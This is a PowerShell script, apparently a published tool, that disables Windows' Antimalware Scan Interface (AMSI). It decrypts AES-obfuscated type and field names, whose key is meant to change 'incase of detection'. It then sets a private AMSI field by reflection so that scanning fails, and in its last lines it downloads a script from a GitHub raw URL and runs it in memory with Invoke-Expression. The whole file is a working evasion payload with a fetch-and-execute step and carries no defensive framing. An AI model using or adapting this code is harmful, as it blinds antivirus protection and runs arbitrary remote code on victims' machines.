#Decrypt Base64 string Encrypted with AES-128 (string, key, IV)
function Decrypt-StringAES128 {
    param (
        [Parameter(Mandatory=$true)]
        [string]$EncryptedText,
        [Parameter(Mandatory=$true)]
        [string]$Key,
        [Parameter(Mandatory=$true)]
        [string]$InitializationVector
    )

    $utf8 = New-Object System.Text.UTF8Encoding
    $cipherBytes = [Convert]::FromBase64String($EncryptedText)

    $aes = New-Object System.Security.Cryptography.AesManaged
    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
    $aes.KeySize = 128
    $aes.BlockSize = 128

    $keyBytes = $utf8.GetBytes($Key)
    $aes.Key = $keyBytes

    $ivBytes = $utf8.GetBytes($InitializationVector)
    $aes.IV = $ivBytes

    $transform = $aes.CreateDecryptor()
    $plainBytes = $transform.TransformFinalBlock($cipherBytes, 0, $cipherBytes.Length)

    $plainText = $utf8.GetString($plainBytes)

    return $plainText
}

# Change This Part to set new Key incase of detection
$key = "1234567890123456"
$iv = "1234567890123456"

# Enctypted Flagged strings (should not be change)
$encryptedString1 = '/DIMW3ttMbTXKLQI2baI5w=='
$encryptedString2 = '23Acj6eCPo3ShL5+m54DNQ=='

# Do not change
$repalcement1 = $null
$repalcement2 = $true

# In memory decryption
$decryptedString1 = Decrypt-StringAES128 -EncryptedText $encryptedString1 -Key $key -InitializationVector $iv
$decryptedString2 = Decrypt-StringAES128 -EncryptedText $encryptedString2 -Key $key -InitializationVector $iv

#Powershell Reflective Setting A*** to Fail
[Ref].Assembly.GetType('System.Management.Automation.'+$decryptedString1).GetField($decryptedString2,'NonPublic,Static').SetValue($repalcement1,$repalcement2)

#Change this to execute desierd command freely (Only in memory execution in running PS proccess)
$scriptContent = Invoke-WebRequest -Uri https://raw.githubusercontent.com/M0M3NTUM44/AMSIReflectionCrypt/main/TestScript.ps1 -UseBasicParsing
Invoke-Expression -Command $scriptContent
